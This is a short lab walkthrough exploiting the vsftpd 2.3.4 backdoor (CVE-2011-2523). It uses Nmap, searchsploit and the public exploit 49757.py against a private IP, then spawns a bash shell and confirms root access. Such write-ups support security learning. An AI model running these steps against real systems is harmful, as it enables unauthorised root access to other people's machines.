# FTP Exploit:

1. ***First, let's identify the FTP Service with Nmap***

   ![Screenshot](https://github.com/user-attachments/assets/e998c03f-c81a-49ca-bcc6-e394ceedfe5d)
   
   - As we see, the FTP version is 2.3.4.
   - Anonymous login is allowed! :)

   - Now, let's use SearchSploit to see if there is any vulnerability for this FTP version:
     ```bash
     searchsploit vsftpd 2.3.4
     ```
   - We found a backdoor command execution vulnerability.
   - Let's bring the file to our folder location (in this case, the Desktop):
     ```bash
     searchsploit -m unix/remote/49757.py
     ```

   ![image](https://github.com/user-attachments/assets/55cb771a-3e36-45cb-85ac-9d306a653bca)
   
   - Take a look at the Python file.

   -  **The python file here:** [Link](./49757.py)
   
   ![image](https://github.com/user-attachments/assets/f3e1b257-1cd0-4ae8-b9bb-df88c735dd7f)
   - We can see that the code will open a backdoor connection with the victim machine. There is a CVE for this bug:
     ```bash
     CVE: CVE-2011-2523
     ```
    
   - You can look it up and you will find it's a critical vulnerability.
   ![image](https://github.com/user-attachments/assets/69a4fb83-bfbd-4982-9e8e-4743188119c6)

3. ***Now let's exploit***

   - Let's give it a try and run the Python file with the machine IP:
     ```bash
     python2 49757.py 192.168.1.4
     ```
   - We will see that we get a reverse shell.
   - Let's make it prettier by running bash instead of shell:
     ```bash
     python -c "import pty; pty.spawn('/bin/bash')"
     ```
   - Now let's check our user with:
     ```bash
     whoami
     id
     ```
   - We will see that we are ROOT! :)
   ![image](https://github.com/user-attachments/assets/bc69af34-040d-477e-87f6-533112d78f14)


      ### HAPPY HUNTING! :D
